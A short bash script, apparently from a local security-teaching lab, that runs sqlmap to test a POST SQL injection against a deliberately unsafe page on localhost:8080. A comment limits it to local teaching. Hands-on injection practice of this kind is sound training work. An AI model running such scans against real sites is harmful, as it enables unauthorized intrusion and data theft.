#!/bin/bash
# 本 Lab 僅限本機教學，禁止掃描未授權網站。
set -e
echo "[*] sqlmap - POST SQL Injection (post-unsafe.php)"
sqlmap -u "http://localhost:8080/post-unsafe.php" --data="username=admin" --batch --level=2 --risk=1
echo "[*] Done"
